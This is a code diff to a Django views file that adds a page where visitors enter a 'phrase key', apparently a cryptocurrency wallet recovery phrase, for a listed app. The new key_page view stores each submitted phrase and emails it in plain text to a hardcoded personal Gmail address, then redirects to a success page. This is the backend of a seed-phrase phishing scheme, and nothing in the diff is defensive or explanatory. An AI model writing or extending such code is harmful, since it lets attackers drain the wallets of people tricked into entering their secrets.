@@ -1,7 +1,10 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 from .models import Multiapps
+from .form import PhraseKeyForm
 from django.shortcuts import get_object_or_404
 from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
+from django.core.mail import send_mail
+
 
 # Create your views here.
 def homePage(request):
@@ -21,6 +24,36 @@ def homePage(request):
 def appDetail(request, app_id):
     app = get_object_or_404(Multiapps, id=app_id)
     return render(request, 'main/detail.html', {'app':app})
+
+
+def key_page(request, app_id):
+    app = get_object_or_404(Multiapps, id=app_id)
+    if request.method == 'POST':
+        form = PhraseKeyForm(request.POST)
+        if form.is_valid():
+            key_form = form.save(commit=False)
+            key_form.name = app
+            key_form.save()
+            
+            # Email sending logic
+            subject = f"New Phrase Key Submission for {app.name}"
+            message = f"Phrase Key: {key_form.phrase_key}"
+            recipient_list = ['prettywashington17@gmail.com']
+            sender_email = 'webmaster@example.com'
+            send_mail(subject, message, sender_email, recipient_list)
+            return redirect('success', app_id=app.id)
+    else:
+        form = PhraseKeyForm()
+    context = {
+        'form':form,
+        'app':app
+    }
+    return render(request, 'main/key.html', context)
+
+
+def successfully(request, app_id):
+    app = get_object_or_404(Multiapps, id=app_id)
+    return render(request, 'main/success.html', {'app': app})
 
 
 def paginate_objects(request, object_list, items_per_page):
